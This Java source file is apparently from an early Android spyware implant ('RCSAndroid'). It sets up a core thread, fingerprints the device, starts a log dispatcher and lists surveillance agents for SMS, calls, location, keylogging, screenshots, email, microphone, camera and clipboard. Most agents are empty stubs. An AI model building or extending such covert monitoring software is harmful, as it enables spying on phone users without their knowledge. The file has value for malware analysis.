/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

public class CoreThread extends Activity implements Runnable {
	private boolean bStopCore = false;
	private Resources resources;
	private Thread coreThread;
	private ContentResolver contentResolver;
	private Status statusObj;

	public boolean Start(Resources r, ContentResolver cr) {
		coreThread = new Thread(this);

		resources = r;
		contentResolver = cr;
		
		Check.asserts(resources != null, "Null Resources");
		
		coreThread.start();
		return true;
	}

	public boolean Stop() {
		bStopCore = true;
		Log.d("Que", "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	public void run() {
		Log.d("Que", "RCS Thread Started");

		try {
			statusObj = Status.self();
			
			// Initialize the configuration object
			Configuration conf = new Configuration(this.resources);
			
			// Identify the device uniquely 
			Device device = new Device(contentResolver);
			device.init();
			
			// Load the configuration
			conf.LoadConfiguration();
			
			// Start log dispatcher
			LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();
			
			// Start agents
			StartAgents();
			
			Utils.sleep(3000);
			DeviceAgent deviceAgent = new DeviceAgent();
			deviceAgent.start();
			
			SnapshotAgent snapshotAgent = new SnapshotAgent();
			snapshotAgent.start();
			
			deviceAgent.sendMessage(Agent.AGENT_STOP, 0x0);
			snapshotAgent.sendMessage(Agent.AGENT_STOP, 0x0);
			
			Utils.sleep(60000);
			
			// Ci stiamo chiudendo
			logDispatcher.halt();
			
			while (logDispatcher.isAlive())
				Utils.sleep(250);
		} catch (RCSException rcse) {
			rcse.printStackTrace();
			Log.d("Que", "RCSException() detected");
		} catch (Exception e) {
			e.printStackTrace();
			Log.d("Que", "Exception() detected");			
		}
		
		return;
		
		/*while (bStopCore == false) {
			// Task Init

			// Check Action
		}*/
	}
	
	private void StartAgents() {
		HashMap<Integer, Agent> agents;
		
		agents = statusObj.getAgentsMap();
		
		if (agents == null) {
			Log.d("Que", "Agents map null");
			return;
		}
		
		Iterator<Map.Entry<Integer, Agent>> it = agents.entrySet().iterator();

		while (it.hasNext()) {
			Map.Entry<Integer, Agent> pairs = it.next();

			if (pairs.getValue().getStatus() != Agent.AGENT_ENABLED)
				continue;
			
			switch (pairs.getKey()) {
				case Agent.AGENT_SMS:
					break;
					
				case Agent.AGENT_TASK:
					break;
					
				case Agent.AGENT_CALLLIST:
					break;
					
				case Agent.AGENT_DEVICE:
					break;
					
				case Agent.AGENT_POSITION:
					break;
					
				case Agent.AGENT_CALL:
					break;
					
				case Agent.AGENT_CALL_LOCAL:
					break;
					
				case Agent.AGENT_KEYLOG:
					break;
					
				case Agent.AGENT_SNAPSHOT:
					SnapshotAgent snapshotAgent = new SnapshotAgent();
					snapshotAgent.start();
					break;
					
				case Agent.AGENT_URL:
					break;
					
				case Agent.AGENT_IM:
					break;
					
				case Agent.AGENT_EMAIL:
					break;
					
				case Agent.AGENT_MIC:
					break;
					
				case Agent.AGENT_CAM:
					break;
					
				case Agent.AGENT_CLIPBOARD:
					break;
					
				case Agent.AGENT_CRISIS:
					break;
					
				case Agent.AGENT_APPLICATION:
					break;
					
				default:
					break;
			}
		}
	}

	public boolean Init() {
		return false;
	}
	
	public boolean Run() {
		return false;
	}
}
